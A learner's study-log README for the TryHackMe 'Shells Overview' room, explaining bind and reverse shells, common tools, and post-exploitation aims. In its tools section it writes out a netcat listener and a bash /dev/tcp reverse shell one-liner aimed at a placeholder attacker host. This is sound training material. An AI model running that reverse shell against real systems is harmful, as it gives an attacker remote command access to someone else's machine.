# 🐚 DAY 41 Shells Overview — TryHackMe

## 📌 Overview

This repository documents my progress in the **"Shells Overview"** room on TryHackMe.

As of today, I have completed **up to Task 5**, with Tasks 6–9 scheduled for completion tomorrow.

This room introduces the fundamental concepts of shells in cybersecurity, including different shell types, their purposes, and how they are used during offensive security engagements.

---

## 🎯 Learning Objectives

* Understand what a shell is
* Differentiate between bind shells and reverse shells
* Learn when and why attackers use different shell types
* Understand basic shell interaction concepts
* Prepare for practical shell exploitation

---

## 🧠 What is a Shell?

A **shell** is a program that allows a user to interact with an operating system.

In cybersecurity, shells are commonly used after exploitation to gain command execution on a target system.

There are two main categories:

* Local Shell
* Remote Shell

---

## 🔁 Bind Shell vs Reverse Shell

### 🔓 Bind Shell

* The target machine opens a port.
* The attacker connects to that open port.

Flow:

```
Attacker  --->  Target (Listening Port)
```

Risk:

* Firewalls often block inbound connections.

---

### 🔄 Reverse Shell

* The attacker listens for incoming connections.
* The target connects back to the attacker.

Flow:

```
Target  --->  Attacker (Listening)
```

Advantage:

* Bypasses many firewall restrictions.
* More common in real-world engagements.

---

## 🛠️ Common Shell Tools

Some common tools used to obtain shells:

* Netcat (nc)
* Ncat
* Socat
* Metasploit
* Python one-liners

Example Netcat listener:

```bash
nc -lvnp 4444
```

Example reverse shell (Linux):

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## 🧠 Key Concepts Learned (Up to Task 5)

✔ What shells are and why they matter
✔ Difference between bind and reverse shells
✔ Basic networking concepts related to shells
✔ Role of shells in post-exploitation

---

## 🔐 Security Relevance (Red Team Perspective)

Shell access is often the **goal of exploitation**.

Once a shell is obtained, attackers can:

* Enumerate the system
* Escalate privileges
* Pivot to other machines
* Extract sensitive data

Understanding shell behavior is fundamental for:

* Offensive Security
* CTF challenges
* Real-world penetration testing

---

## 📅 Progress Log

* ✅ Tasks 1–5 completed
* ⏳ Tasks 6–9 scheduled

---

## 🚀 Next Steps

* Practice reverse shell stabilization
* Learn about upgrading shells (PTY, fully interactive shells)
* Explore Windows PowerShell reverse shells
* Complete remaining tasks (6–9)

